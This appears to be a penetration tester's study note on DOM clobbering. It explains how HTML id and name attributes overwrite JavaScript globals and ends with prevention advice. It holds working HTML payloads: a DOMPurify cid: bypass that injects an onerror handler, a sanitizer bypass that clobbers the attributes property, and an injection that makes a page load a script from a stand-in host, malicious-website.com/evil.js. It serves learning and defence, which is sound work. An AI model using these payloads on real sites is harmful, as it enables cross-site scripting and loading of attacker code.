
> [!Danger] 
> Testing for this vulnerability will break the current browser tab, So you need to make one test  for each tab.

## When to test for it?
- If the application enable you to use specific set of html elements, like `<a>`, `<form>`. That worth checking for DOM clobbering.
- DOM invader can help you. But it fails sometimes
- **Only** certain elements can use the **name attribute** to clobber globals, they are: `embed`, `form`, `iframe`, `image`, `img` and `object`.

---
## What is DOM clobbering?

refere to [[DOM Clobbering]]

### Basics

It's possible to generate global variables inside the JS context with the attributes id and name in HTML tags.

<form id=x></form>
```html
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```

Only certain elements can use the name attribute to clobber globals, they are: embed, form, iframe, image, img and object.

Interestingly, when you use a form element to clobber a variable, you will get the toString value of the element itself: [object HTMLFormElement] but with anchor the toString will be the anchor href. Therefore, if you clobber using the a tag, you can control the value when it's treated as a string:

```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```

### Arrays & Attributes

It's also possible to clobber an array and object attributes:

```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```

To clobber a 3rd attribute (e.g. x.y.z), you need to use a form:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```

Clobbering more attributes is more complicated but still possible, using iframes:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```

The style tag is used to give enough time to the iframe to render. Without it you will find an alert of undefined.

To clobber deeper attributes, you can use iframes with html encoding this way:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```

### Filter Bypassing

If a filter is looping through the properties of a node using something like document.getElementByID('x').attributes you could clobber the attribute .attributes and break the filter. Other DOM properties like tagName , nodeName or parentNode and more are also clobberable.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```



**Trick**: `**DOMPurify**` allows you to use the `**cid:**` protocol, which **does not URL-encode double-quotes**. This means you can **inject an encoded double-quote that will be decoded at runtime**. Therefore, injecting something like `**<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">**` will make the HTML encoded `&quot;` to be **decoded on runtime** and **escape** from the attribute value to **create** the `**onerror**` event.

Another technique uses a `**form**` element. Certain client-side libraries inspect the attributes of a newly created form element to clean them. However, by adding an `input` with `id=attributes` inside the form, you effectively overwrite the attributes property, preventing the sanitizer from accessing the actual attributes.


---
## How to exploit DOM-clobbering vulnerabilities

A common pattern used by JavaScript developers is:

```js
var someObject = window.someObject || {};
```

If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:

```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:

```html
<a id=someObject>
<a id=someObject name=url href=//malicious-website.com/evil.js>
```

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.

Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties. For example, clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection:

```html
<form onclick=alert(1)><input id=attributes>Click me
```

In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element. Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead. As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i < element.attributes.length`) are not met, and the filter simply moves on to the next element instead. This results in the `onclick` event being ignored altogether by the filter, which subsequently allows the `alert()` function to be called in the browser.

---
## How to prevent DOM-clobbering attacks

In the simplest terms, you can prevent DOM-clobbering attacks by implementing checks to make sure that objects or functions are what you expect them to be. For instance, you can check that the attributes property of a DOM node is actually an instance of `NamedNodeMap`. This ensures that the property is an attributes property and not a clobbered HTML element.

You should also avoid writing code that references a global variable in conjunction with the logical OR operator `||`, as this can lead to DOM clobbering vulnerabilities.

In summary:
- Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or function is not a DOM node.
- Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.
- Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.